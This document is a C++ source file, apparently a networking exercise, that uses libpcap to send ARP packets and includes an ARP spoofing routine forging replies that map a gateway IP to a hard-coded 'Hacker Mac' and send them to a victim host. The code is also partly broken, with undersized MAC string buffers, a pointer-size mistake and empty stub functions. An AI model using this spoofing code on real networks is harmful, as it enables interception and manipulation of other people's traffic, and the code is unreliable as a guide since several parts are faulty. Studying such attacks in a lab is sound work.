#include <string>
#include <cstdio>
#include <pcap.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <netinet/in.h>
#include <string.h>
#include "ethhdr.h"
#include "arphdr.h"
using namespace std;
#define MAC_SIZE 6
#define TMAC_SIZE 11
#pragma pack(push, 1)
pcap_t* handle;

char my_ip[40];
char my_tmac[TMAC_SIZE];
unsigned char my_mac[MAC_SIZE];
unsigned char test_mac[14];
char  *dev;

void transform_mac(unsigned char* mac,char* tmac);
void find_my_ip();
void find_my_mac();
void send_forg_arp(char *ip,char* mac);	
void find_mac(char *ip, char* mac);

struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

int main(int argc, char* argv[]) {

	printf("argc = %d\n", argc);	
	int size=0;	
	if ( argc < 4 | argc % 2 == 1) {//input error
		usage();
		return -1;
	}
	size = argc / 2 - 1; // number of arp packet
	printf("size = %d\n",size);

	dev = argv[1];//interface assign
	char errbuf[PCAP_ERRBUF_SIZE];
	handle = pcap_open_live(dev,BUFSIZ , 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	///////////////////////////////////////////////// 
	find_my_mac();//my_mac = mac;
	find_my_ip();//my_ip = interface ip;
	//printf("\n my interface mac = %s",my_mac);	
	//printf("\n my interface ip= %s\n", my_ip);
	for(int i=0; i<6;i++)//print mac
	{
		printf("%.2x.",my_mac[i]);
	}

	transform_mac(my_mac,my_tmac);
	printf("\n my interface mac = %s",my_tmac);	
	printf("\n my interface ip= %s\n", my_ip);
//	return 0;
	char sender_mac[11];
	char target_mac[11];

	for(int i=0; i< size;i++)
	{
		find_mac(argv[i*2+2],sender_mac);// find sender mac
		find_mac(argv[i*2+3],target_mac);// find target mac

	//	send_forg_arp(argc[i*2+2],argc[i*2+3]);	
	}
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("28:d0:ea:de:1f:5c");//Sender Mac
	packet.eth_.smac_ = Mac("08:00:27:03:83:4d");//Hacker Mac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac("08:00:27:03:83:4d");//Hacker Mac
	packet.arp_.sip_ = htonl(Ip("172.30.1.254"));//Gateway Ip
	packet.arp_.tmac_ = Mac("28:d0:ea:de:1f:5c");//Sender Mac
	packet.arp_.tip_ = htonl(Ip("172.30.1.57"));//Sender Ip

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	pcap_close(handle);
}
void transform_mac(unsigned char* mac, char* tmac){
	int size=0;
	for(int i=0; i < 6;i++)
	{
		if(i==5){
			sprintf(&tmac[size],"%.2x",mac[i]);
			break;
		}	
		size +=sprintf(&tmac[size],"%.2x:",mac[i]);
		//printf(" \nstr =%s and size = %d ",str, size);
	}
	printf(" \nmac =%s ", tmac);
}

void find_mac(char* ip,char* mac){
	EthArpPacket packet;
	printf("\n ip = %s",ip); // check input
	
	packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");//broad cast Mac
	packet.eth_.smac_ = Mac(my_tmac);//my Mac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(my_tmac);//my Mac
	packet.arp_.sip_ = htonl(Ip(my_ip));//my Ip
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");//your Mac
	packet.arp_.tip_ = htonl(Ip(ip));//your Ip
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

}
void send_forg_arp(char *ip,char* mac){

	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("28:d0:ea:de:1f:5c");//Sender Mac
	packet.eth_.smac_ = Mac("08:00:27:03:83:4d");//Hacker Mac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac("08:00:27:03:83:4d");//Hacker Mac
	packet.arp_.sip_ = htonl(Ip("172.30.1.254"));//Gateway Ip
	packet.arp_.tmac_ = Mac("28:d0:ea:de:1f:5c");//Sender Mac
	packet.arp_.tip_ = htonl(Ip("172.30.1.57"));//Sender Ip

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	pcap_close(handle);
}

void ck_ip_header_len(u_char *buf){
}
void ck_tcp_header_len(u_char *buf){
}
bool ck_tcp(u_char *buf){
	return true;
}

bool pcap_print(u_char *buf)
{
	return true;
}
void find_my_ip()
{
	struct ifreq ifr;
//	char ipstr[40];
	int s;

	s = socket(AF_INET, SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, dev, IFNAMSIZ);

	if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
		printf("Error");
	} else {
		inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2,my_ip,sizeof(struct sockaddr));
		//printf("myOwn IP Address is %s\n", my_ip);
	}

}
void find_my_mac()
{
    struct ifreq ifr;
    struct ifconf ifc;
    char buf[1024];
    int success = 0;
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);

	printf("start \n ");
	setsockopt(sock, SOL_SOCKET, SO_BINDTODEVICE, dev,sizeof(dev) );
	printf("end \n ");
    
	ifc.ifc_len = sizeof(buf);
    ifc.ifc_buf = buf;
    if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) { /* handle error */ }

    struct ifreq* it = ifc.ifc_req;
    const struct ifreq* const end = it + (ifc.ifc_len / sizeof(struct ifreq));
	char *tempdev;	

    for (; it != end; ++it) {
		//printf("namme = %s\n",it->ifr_name);
        strcpy(ifr.ifr_name, it->ifr_name);
		//strcpy(tempdev,it->ifr_name);
//		printf("namme = %s %s\n",dev,it->ifr_name);
        if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
            if (! (ifr.ifr_flags & IFF_LOOPBACK)) { // don't count loopback

  				if(strcmp(it->ifr_name,dev)){
					continue;//same interface mac 
				}
	
                if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
                    success = 1;
                    break;
                }
            }
        }
        else { /* handle error */ }
    }

    if (success) 
	{
		memcpy(my_mac, ifr.ifr_hwaddr.sa_data, 6);
//		inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2,my_ip,sizeof(struct sockaddr));
	}
//    if (success) memcpy(test_mac, ifr.ifr_hwaddr.sa_data, 14);
	
	printf("\n test_ip =%s\n",my_ip);
	/*
	for(int i=0; i< 14;i++)
	{
		printf("%.2x",test_mac[i]);
	}
	*/
}
